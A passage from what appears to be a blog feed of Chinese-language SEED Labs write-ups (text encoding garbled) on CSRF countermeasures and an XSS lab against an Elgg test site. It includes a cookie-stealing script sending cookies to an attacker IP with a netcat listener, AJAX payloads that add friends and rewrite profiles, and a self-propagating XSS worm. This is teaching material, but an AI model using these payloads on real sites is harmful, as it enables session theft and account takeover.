&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>Question 1: The forged HTTP request needs Aliceâ€™s user id (guid) to work properly. If Boby targets<br>Alice specifically, before the attack, he can find ways to get Aliceâ€™s user id. Boby does not know<br>Aliceâ€™s Elgg password, so he cannot log into Aliceâ€™s account to get the information. Please describe<br>how Boby can solve this problem.</p><ul><li>f12</li></ul><p>Question 2: If Boby would like to launch the attack to anybody who visits his malicious web page.<br>In this case, he does not know who is visiting the web page beforehand. Can he still launch the CSRF</p><ul><li>ä¸èƒ½</li></ul><h1 id="Task-4-Enabling-Elggâ€™s-Countermeasure"><a href="#Task-4-Enabling-Elggâ€™s-Countermeasure" class="headerlink" title="Task 4: Enabling Elggâ€™s Countermeasure"></a>Task 4: Enabling Elggâ€™s Countermeasure</h1><p>elggé˜²æ­¢csrfæ”»å‡»çš„å®‰å…¨æªæ–½ï¼š</p><ul><li>åœ¨é¡µé¢ä¸­æ”¾ç½®ä¸€ä¸ªç§˜å¯†ä»¤ç‰Œï¼ˆtokenï¼‰ï¼Œé€šè¿‡æ£€æŸ¥ä»¤ç‰Œæ˜¯å¦å‡ºç°åœ¨è¯·æ±‚ä¸­ï¼Œå®ƒä»¬å¯ä»¥åˆ¤æ–­è¯·æ±‚æ˜¯åŒä¸€ç«™ç‚¹è¯·æ±‚è¿˜æ˜¯è·¨ç«™ç‚¹è¯·æ±‚</li><li>elggåœ¨HTTPè¯·æ±‚ä¸­åŠ å…¥äº†<code>__elgg_t</code>å’Œ<code>__elgg_token</code>å‚æ•°ï¼Œåˆ†åˆ«æ˜¯timestampï¼ˆæ—¶é—´æˆ³ï¼‰å’Œã€ç«™ç‚¹ç§˜å¯†å€¼(ä»æ•°æ®åº“æ£€ç´¢)ã€æ—¶é—´æˆ³ã€ç”¨æˆ·ä¼šè¯ ID å’Œéšæœºç”Ÿæˆçš„ä¼šè¯å­—ç¬¦ä¸²çš„å“ˆå¸Œå€¼ã€‘ï¼ŒæœåŠ¡å™¨ä¼šéªŒè¯è¿™ä¸¤ä¸ªæ˜¯å¦æ­£ç¡®</li><li>validå‡½æ•°éªŒè¯tokenå’Œæ—¶é—´æˆ³ï¼Œseedåœ¨è¿™ä¸ªå‡½æ•°çš„å¼€å¤´æ·»åŠ äº†ä¸€ä¸ªè¿”å›å€¼ä»è€Œç¦ç”¨äº†éªŒè¯</li><li>å¦‚æœè¦å¯ç”¨éªŒè¯åªéœ€åˆ é™¤returnè¯­å¥<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> function <span class="hljs-title">validate</span><span class="hljs-params">(Request $request)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span>; <span class="hljs-comment">// Added for SEED Labs (disabling the CSRF countermeasure)</span><br>    $token = $request-&gt;getParam(â€™__elgg_tokenâ€™);<br>    $ts = $request-&gt;getParam(â€™__elgg_tsâ€™);<br>    ... (code omitted) ...<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="Task-5-Experimenting-with-the-SameSite-Cookie-Method"><a href="#Task-5-Experimenting-with-the-SameSite-Cookie-Method" class="headerlink" title="Task 5: Experimenting with the SameSite Cookie Method"></a>Task 5: Experimenting with the SameSite Cookie Method</h1><p>Cookie çš„SameSiteå±æ€§æœ‰ä¸‰ä¸ªé€‰æ‹©:</p><ul><li>Strict</li><li>Lax</li><li>None</li></ul><p>å€¼ä¸ºStrictï¼Œåˆ™ä¸ä¼šè·¨ç«™è¯·æ±‚ä½¿ç”¨</p><p>å¯¼èˆªåˆ°ç›®æ ‡ç½‘å€çš„ GET è¯·æ±‚ï¼ŒåªåŒ…æ‹¬ä¸‰ç§æƒ…å†µï¼šé“¾æ¥ï¼Œé¢„åŠ è½½è¯·æ±‚ï¼ŒGET è¡¨å•ã€‚è¯¦è§ä¸‹è¡¨ã€‚</p><table><thead><tr><th>è¯·æ±‚ç±»å‹</th><th>ç¤ºä¾‹</th><th>æ­£å¸¸æƒ…å†µ</th><th>Lax</th></tr></thead><tbody><tr><td>é“¾æ¥</td><td><code>&lt;a href=&quot;...&quot;&gt;&lt;/a&gt;</code></td><td>å‘é€ Cookie</td><td>å‘é€ Cookie</td></tr><tr><td>é¢„åŠ è½½</td><td><code>&lt;link rel=&quot;prerender&quot; href=&quot;...&quot;/&gt;</code></td><td>å‘é€ Cookie</td><td>å‘é€ Cookie</td></tr><tr><td>GET è¡¨å•</td><td><code>&lt;form method=&quot;GET&quot; action=&quot;...&quot;&gt;</code></td><td>å‘é€ Cookie</td><td>å‘é€ Cookie</td></tr><tr><td>POST è¡¨å•</td><td><code>&lt;form method=&quot;POST&quot; action=&quot;...&quot;&gt;</code></td><td>å‘é€ Cookie</td><td>ä¸å‘é€</td></tr><tr><td>iframe</td><td><code>&lt;iframe src=&quot;...&quot;&gt;&lt;/iframe&gt;</code></td><td>å‘é€ Cookie</td><td>ä¸å‘é€</td></tr><tr><td>AJAX</td><td><code>$.get(&quot;...&quot;)</code></td><td>å‘é€ Cookie</td><td>ä¸å‘é€</td></tr><tr><td>Image</td><td><code>&lt;img src=&quot;...&quot;&gt;</code></td><td>å‘é€ Cookie</td><td>ä¸å‘é€</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-labï¼šCross-site Scripting Attack Lab</title>
    <link href="/p/53d24de/"/>
    <url>/p/53d24de/</url>
    
    <content type="html"><![CDATA[<p>æ— å†…é¬¼ï¼Œæ•´ç‚¹å‰ç«¯</p><h1 id="lab-setup"><a href="#lab-setup" class="headerlink" title="lab setup"></a>lab setup</h1><p>å‚è€ƒseedç³»åˆ—å…¶ä»–åšå®¢</p><h1 id="Task-1-Posting-a-Malicious-Message-to-Display-an-Alert-Window"><a href="#Task-1-Posting-a-Malicious-Message-to-Display-an-Alert-Window" class="headerlink" title="Task 1: Posting a Malicious Message to Display an Alert Window"></a>Task 1: Posting a Malicious Message to Display an Alert Window</h1><p>é€šè¿‡åœ¨ä¸ªäººä¸»é¡µæ±‡æ€»åµŒå…¥JavaScript ç¨‹åºï¼Œè¿™æ ·å½“å…¶ä»–ç”¨æˆ·æŸ¥çœ‹ä¸ªäººä¸»é¡µæ—¶ï¼Œå°†æ‰§è¡Œ JavaScript ç¨‹åºå¹¶æ˜¾ç¤ºä¸€ä¸ªè­¦å‘Šçª—å£</p><ul><li>åœ¨brief descriptionæ¡†ä¸­å¡«å…¥<code>&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code></li></ul><p>å¦‚æœæƒ³è¿è¡Œä¸€ä¸ªå¾ˆé•¿çš„ JavaScriptï¼Œä½†æ˜¯å—åˆ°è¡¨å•ä¸­å¯é”®å…¥å­—ç¬¦æ•°é‡çš„é™åˆ¶ï¼Œå¯ä»¥å°† JavaScript ç¨‹åºå­˜å‚¨åœ¨ä¸€ä¸ªç‹¬ç«‹jsæ–‡ä»¶ä¸­ï¼Œç„¶åä½¿ç”¨ &lt; script &gt; æ ‡è®°ä¸­çš„ src å±æ€§å¼•ç”¨å®ƒ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span><br>    src=<span class="hljs-string">&quot;http://www.example.com/myscripts.js&quot;</span>&gt;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><h1 id="Task-2-Posting-a-Malicious-Message-to-Display-Cookies"><a href="#Task-2-Posting-a-Malicious-Message-to-Display-Cookies" class="headerlink" title="Task 2: Posting a Malicious Message to Display Cookies"></a>Task 2: Posting a Malicious Message to Display Cookies</h1><p>å½“å…¶ä»–ç”¨æˆ·æŸ¥çœ‹ä¸ªäººä¸»é¡µæ—¶ï¼Œç”¨æˆ·çš„ cookie å°†æ˜¾ç¤ºåœ¨è­¦å‘Šçª—å£ä¸­:<code>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</code></p><h1 id="Task-3-Stealing-Cookies-from-the-Victimâ€™s-Machine"><a href="#Task-3-Stealing-Cookies-from-the-Victimâ€™s-Machine" class="headerlink" title="Task 3: Stealing Cookies from the Victimâ€™s Machine"></a>Task 3: Stealing Cookies from the Victimâ€™s Machine</h1><p>æ”»å‡»è€…å¸Œæœ›é€šè¿‡ JavaScript ä»£ç å°† cookie å‘é€ç»™è‡ªå·±ï¼Œå¯ä»¥å¦‚ä¸‹æ„é€ jsä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;script&gt;document.write(<span class="hljs-string">&#x27;&lt;img src=http://10.9.0.1:5555?c=&#x27;</span> + escape(document.cookie) + <span class="hljs-string">&#x27;&gt;&#x27;</span>); &lt;/script&gt;<br></code></pre></td></tr></table></figure><p>å½“ JavaScript æ’å…¥ img æ ‡è®°æ—¶ï¼Œæµè§ˆå™¨å°è¯•ä» src å­—æ®µä¸­çš„ URL åŠ è½½å›¾åƒ; è¿™å¯¼è‡´å‘æ”»å‡»è€…çš„æœºå™¨å‘é€ HTTP GET è¯·æ±‚ï¼Œä¸Šé¢çš„ JavaScript å°† cookie å‘é€åˆ°æ”»å‡»è€…ipçš„ç«¯å£5555(IP åœ°å€ä¸º10.9.0.1) ï¼Œåœ¨é‚£é‡Œæ”»å‡»è€…æœ‰ä¸€ä¸ª TCP æœåŠ¡å™¨ç›‘å¬ç›¸åŒçš„ç«¯å£</p><p>æ”»å‡»è€…æœºå™¨è¿è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lknv 5555<br></code></pre></td></tr></table></figure><ul><li>-l Listen on a specified port and print any data received</li><li>-v Produce more verbose output.</li><li>-n ç›´æ¥ä½¿ç”¨IPåœ°å€ï¼Œè€Œä¸é€šè¿‡åŸŸåæœåŠ¡å™¨</li><li>-k å½“ä¸€ä¸ªè¿æ¥å®Œæˆæ—¶ï¼Œç›‘å¬å¦ä¸€ä¸ªè¿æ¥</li></ul><p>æ”»å‡»è€…shellï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lknv 5555</span><br>Listening on 0.0.0.0 5555<br>Connection received on 10.0.2.15 58018<br>GET /?c=Elgg%3D8fueaeqm5p111ufasemhhpep6n%3B%20elggperm%3Dzv6b-6-jXGHCHP6e8DaQqjlkyRIW883S HTTP/1.1<br>Host: 10.9.0.1:5555<br>User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0<br>Accept: image/webp,*/*<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Connection: keep-alive<br>Referer: http://www.seed-server.com/profile/alice<br></code></pre></td></tr></table></figure><h1 id="Task-4-Becoming-the-Victimâ€™s-Friend"><a href="#Task-4-Becoming-the-Victimâ€™s-Friend" class="headerlink" title="Task 4: Becoming the Victimâ€™s Friend"></a>Task 4: Becoming the Victimâ€™s Friend</h1><p>ç¼–å†™ä¸€ä¸ª XSS è •è™«ï¼Œå°† Samy ä½œä¸ºè®¿é—® Samy é¡µé¢çš„ä»»ä½•å…¶ä»–ç”¨æˆ·çš„æœ‹å‹,è¿™ä¸ªè •è™«ä¸ä¼šè‡ªæˆ‘ä¼ æ’­</p><p>å…ˆç”¨http live headeræŠ“ä¸€ä¸‹åŠ /åˆ å¥½å‹çš„åŒ…ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span>http://www.seed-server.com/action/friends/add?friend=<span class="hljs-number">56</span>&amp;__elgg_ts=<span class="hljs-number">1665136694</span>,<span class="hljs-number">1665136694</span>&amp;__elgg_token=fd<span class="hljs-number">9</span>a<span class="hljs-number">9</span>_Ls<span class="hljs-number">7</span>UPwUtwEuzLjCg,fd<span class="hljs-number">9</span>a<span class="hljs-number">9</span>_Ls<span class="hljs-number">7</span>UPwUtwEuzLjCg<br><br><span class="hljs-attribute">GET</span>http://www.seed-server.com/action/friends/remove?friend=<span class="hljs-number">56</span>&amp;__elgg_ts=<span class="hljs-number">1665136694</span>,<span class="hljs-number">1665136694</span>&amp;__elgg_token=fd<span class="hljs-number">9</span>a<span class="hljs-number">9</span>_Ls<span class="hljs-number">7</span>UPwUtwEuzLjCg,fd<span class="hljs-number">9</span>a<span class="hljs-number">9</span>_Ls<span class="hljs-number">7</span>UPwUtwEuzLjCg<br></code></pre></td></tr></table></figure><p>æ ¹æ®ä¸Šé¢è¯·æ±‚ä¾è‘«èŠ¦ç”»ç“¢ç»„ç»‡ä¸€ä¸‹sendurl(æ³¨æ„ä¸€ä¸‹urlé‡Œé¢çš„friendå’Œfriends)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>    window.onload = function () &#123;<br>        <span class="hljs-keyword">var</span> Ajax=<span class="hljs-keyword">null</span>;<br>        <br>        <span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.security.token.__elgg_ts;<br>        <span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;&amp;__elgg_token=&quot;</span>+elgg.security.token.__elgg_token;<br>        <br>        <span class="hljs-keyword">var</span> sendurl=<span class="hljs-string">&quot;http://www.seed-server.com/action/friends/add?friend=56&quot;</span> + ts + token;<br>        <br>        Ajax=<span class="hljs-keyword">new</span> XMLHttpRequest();<br>        Ajax.open(<span class="hljs-string">&quot;GET&quot;</span>, sendurl, <span class="hljs-keyword">true</span>);<br>        Ajax.send();<br>    &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>Question 1: Explain the purpose of Lines Â¿and Â¡, why are they are needed?ï¼ˆtsã€tokenï¼‰</p><p>æ˜¯ç”¨ä½œé’ˆå¯¹CSRFçš„å®‰å…¨æªæ–½çš„å€¼ï¼Œæ¯æ¬¡åŠ è½½é¡µé¢æ—¶å®ƒä»¬éƒ½ä¼šæ›´æ”¹ï¼Œè¿™é‡ŒåŠ¨æ€è·å–ä½¿ç”¨tokenå®ç°è®¤è¯</p><p>Question 2: If the Elgg application only provide the Editor mode for the â€œAbout Meâ€ field, i.e.,you cannot switch to the Text mode, can you still launch a successful attack?</p><p>ä¸èƒ½ã€‚ç¼–è¾‘å™¨æ¨¡å¼æ·»åŠ äº†é¢å¤–çš„ HTML å¹¶æ›´æ”¹äº†ä¸€äº›ç¬¦å·ï¼Œæ¯”å¦‚<code>&lt;p&gt;</code></p><h1 id="Task-5-Modifying-the-Victimâ€™s-Profile"><a href="#Task-5-Modifying-the-Victimâ€™s-Profile" class="headerlink" title="Task 5: Modifying the Victimâ€™s Profile"></a>Task 5: Modifying the Victimâ€™s Profile</h1><p>è¦æ±‚ä¿®æ”¹å—å®³è€…çš„â€œabout meâ€å­—æ®µ</p><p>æŠ“åŒ…ï¼Œå…ˆçœ‹ä¸€ä¸‹ä¿®æ”¹â€œabout meâ€å­—æ®µå¯¹åº”çš„postè¯·æ±‚contentå­—æ®µä¸­çš„å†…å®¹ï¼š</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment">-----------------------------29413027072745719142433280896</span><br>Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;__elgg_token&quot;</span><br><br>B4kETnpwfAY<span class="hljs-number">-9</span>_DqgFrU3Q<br><span class="hljs-comment">-----------------------------29413027072745719142433280896</span><br>Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;__elgg_ts&quot;</span><br><br><span class="hljs-number">1665148744</span><br><span class="hljs-comment">-----------------------------29413027072745719142433280896</span><br>Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;name&quot;</span><br><br>Boby<br><span class="hljs-comment">-----------------------------29413027072745719142433280896</span><br>Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;description&quot;</span><br><br>&lt;p&gt;wndmd nmsl hhhhh&lt;/p&gt;<br><br><span class="hljs-comment">-----------------------------29413027072745719142433280896</span><br>Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;accesslevel[description]&quot;</span><br><br><span class="hljs-number">0</span><br><span class="hljs-comment">-----------------------------29413027072745719142433280896</span><br>Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;briefdescription&quot;</span><br><br>???????????!!!!!!!!!!!!!!<br><span class="hljs-comment">-----------------------------29413027072745719142433280896</span><br>Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;accesslevel[briefdescription]&quot;</span><br><br><span class="hljs-number">2</span><br><br><span class="hljs-comment">-----------------------------29413027072745719142433280896</span><br>Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;guid&quot;</span><br><br><span class="hljs-number">57</span><br><br></code></pre></td></tr></table></figure><p>æŒ‰ç…§ä¸Šé¢å­—æ®µå¡«å……ä»£ç ï¼Œä¸»è¦é—®é¢˜åœ¨äºcontentå­—ç¬¦ä¸²çš„æ„é€ </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>    window.onload = function()&#123;<br>        <span class="hljs-keyword">var</span> userName=<span class="hljs-string">&quot;&amp;name=&quot;</span>+elgg.session.user.name;<br>        <span class="hljs-keyword">var</span> guid=<span class="hljs-string">&quot;&amp;guid=&quot;</span>+elgg.session.user.guid;<br>        <span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.security.token.__elgg_ts;<br>        <span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;&amp;__elgg_token=&quot;</span>+elgg.security.token.__elgg_token;<br>        <br>        <span class="hljs-keyword">var</span> content=token + ts + userName +<br>            <span class="hljs-string">&quot;&amp;description=IamAlice&amp;accesslevel[description]=2&quot;</span> + guid;<br>        <span class="hljs-keyword">var</span> samyGuid=<span class="hljs-number">56</span>;<br>        <span class="hljs-keyword">var</span> sendurl=<span class="hljs-string">&quot;http://www.seed-server.com/action/profile/edit&quot;</span>;<br>        <br>        <span class="hljs-keyword">if</span>(elgg.session.user.guid!=samyGuid)<br>        &#123;<br>            <span class="hljs-keyword">var</span> Ajax=<span class="hljs-keyword">null</span>;<br>            Ajax=<span class="hljs-keyword">new</span> XMLHttpRequest();<br>            Ajax.open(<span class="hljs-string">&quot;POST&quot;</span>, sendurl, <span class="hljs-keyword">true</span>);<br>            Ajax.setRequestHeader(<span class="hljs-string">&quot;Content-Type&quot;</span>,<br>                                  <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);<br>            Ajax.send(content);<br>        &#125;<br>    &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>ä»¥htmlå½¢å¼è¾“å…¥åˆ°Aliceçš„â€œabout meâ€ä¸­ï¼Œæ¯ä¸€ä¸ªçœ‹åˆ°Aliceçš„ä¸»é¡µçš„äººçš„â€œabout meâ€éƒ½ä¼šè¢«ä¿®æ”¹</p><p>Question 3: Why do we need Line ? Remove this line, and repeat your attack. Report and explainyour observation.</p><p>é˜²æ­¢Aliceè‡ªå·±çš„â€œabout meâ€è¢«ä¿®æ”¹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span> id=worm&gt;<br>    <span class="hljs-built_in">window</span>.onload = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">var</span> name=<span class="hljs-string">&quot;&amp;name=&quot;</span>+elgg.session.user.name;<br>        <span class="hljs-keyword">var</span> guid=<span class="hljs-string">&quot;&amp;guid=&quot;</span>+elgg.session.user.guid;<br>        <span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.security.token.__elgg_ts;<br>        <span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;__elgg_token=&quot;</span>+elgg.security.token.__elgg_token;<br>    <br>        <span class="hljs-keyword">var</span> description = <span class="hljs-string">&quot;&amp;description=&lt;p&gt;Your profile have been attacked!!!&lt;\/p&gt;&quot;</span>&#125;<br>        <span class="hljs-keyword">var</span> scriptstr = <span class="hljs-string">&quot;&lt;script type=\&quot;text\/javascript\&quot; id=worm&gt;&quot;</span> + <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;worm&quot;</span>).innerHTML + <span class="hljs-string">&quot;&lt;\/script&gt;&quot;</span>;<br>    <br>        <span class="hljs-keyword">var</span> content=token + ts + description + <span class="hljs-built_in">encodeURIComponent</span>(scriptstr) + guid + name;<br>    <br>        Ajax=<span class="hljs-keyword">new</span> XMLHttpRequest();<br>        Ajax.open(<span class="hljs-string">&quot;POST&quot;</span>,<span class="hljs-string">&quot;/action/profile/edit&quot;</span>,<span class="hljs-literal">true</span>);<br>        Ajax.setRequestHeader(<span class="hljs-string">&quot;Host&quot;</span>,<span class="hljs-string">&quot;www.xsslabelgg.com&quot;</span>);<br>        Ajax.setRequestHeader(<span class="hljs-string">&quot;Content-type&quot;</span>, <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);<br>        Ajax.send(content);<br>    &#125;<br>&lt;/script&gt;<br><span class="hljs-comment">//å¼•ç”¨è‡ªhttps://blog.csdn.net/qq_39678161/article/details/119908242</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;worm&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="javascript"><span class="xml">    <span class="hljs-keyword">var</span> headerTag = <span class="hljs-string">&quot;&lt;script id=\&quot;worm\&quot; type=\&quot;text/javascript\&quot;&gt;&quot;</span>;</span></span><br><span class="javascript"><span class="xml">    <span class="hljs-keyword">var</span> jsCode = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;worm&quot;</span>).innerHTML;</span></span><br><span class="javascript"><span class="xml">    <span class="hljs-keyword">var</span> tailTag = <span class="hljs-string">&quot;&lt;/&quot;</span> + <span class="hljs-string">&quot;script&gt;&quot;</span>;</span></span><br><span class="javascript"><span class="xml">    <span class="hljs-keyword">var</span> wormCode = <span class="hljs-built_in">encodeURIComponent</span>(headerTag + jsCode + tailTag);</span></span><br><span class="javascript"><span class="xml">    <span class="hljs-built_in">window</span>.onload = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;</span></span><br><span class="javascript"><span class="xml">        <span class="hljs-keyword">var</span> userName=<span class="hljs-string">&quot;&amp;name=&quot;</span>+elgg.session.user.name;</span></span><br><span class="javascript"><span class="xml">        <span class="hljs-keyword">var</span> guid=<span class="hljs-string">&quot;&amp;guid=&quot;</span>+elgg.session.user.guid;</span></span><br><span class="javascript"><span class="xml">        <span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.security.token.__elgg_ts;</span></span><br><span class="javascript"><span class="xml">        <span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;&amp;__elgg_token=&quot;</span>+elgg.security.token.__elgg_token;</span></span><br><span class="javascript"><span class="xml">        </span></span><br><span class="javascript"><span class="xml">        <span class="hljs-keyword">var</span> content=token + ts + userName +</span></span><br><span class="javascript"><span class="xml">            <span class="hljs-string">&quot;&amp;description=&quot;</span> + wormCode + <span class="hljs-string">&quot;&amp;accesslevel[description]=2&quot;</span> + </span></span><br><span class="javascript"><span class="xml">            <span class="hljs-string">&quot;&amp;briefdescription=samy%20is%20my%20hero&amp;accesslevel[briefdescription]=2&quot;</span> +</span></span><br><span class="javascript"><span class="xml">            guid;</span></span><br><span class="javascript"><span class="xml">        <span class="hljs-keyword">var</span> samyGuid=<span class="hljs-number">59</span>;</span></span><br><span class="javascript"><span class="xml">        <span class="hljs-keyword">var</span> sendurl=<span class="hljs-string">&quot;http://www.seed-server.com/action/profile/edit&quot;</span>;</span></span><br><span class="javascript"><span class="xml">        </span></span><br><span class="javascript"><span class="xml">        <span class="hljs-keyword">if</span>(elgg.session.user.guid!=samyGuid)</span></span><br><span class="javascript"><span class="xml">        &#123;</span></span><br><span class="javascript"><span class="xml">            <span class="hljs-keyword">var</span> Ajax=<span class="hljs-literal">null</span>;</span></span><br><span class="javascript"><span class="xml">            Ajax=<span class="hljs-keyword">new</span> XMLHttpRequest();</span></span><br><span class="javascript"><span class="xml">            Ajax.open(<span class="hljs-string">&quot;POST&quot;</span>, sendurl, <span class="hljs-literal">true</span>);</span></span><br><span class="javascript"><span class="xml">            Ajax.setRequestHeader(<span class="hljs-string">&quot;Content-Type&quot;</span>,</span></span><br><span class="javascript"><span class="xml">                                  <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);</span></span><br><span class="javascript"><span class="xml">            Ajax.send(content);</span></span><br><span class="javascript"><span class="xml">        &#125;</span></span><br><span class="javascript"><span class="xml">    &#125;</span></span><br><span class="javascript"><span class="xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml">//å¼•ç”¨è‡ªhttps://blog.csdn.net/l4kjih3gfe2dcba1/article/details/118768821</span><br></code></pre></td></tr></table></figure><h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.example.com/myscripts.js&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span 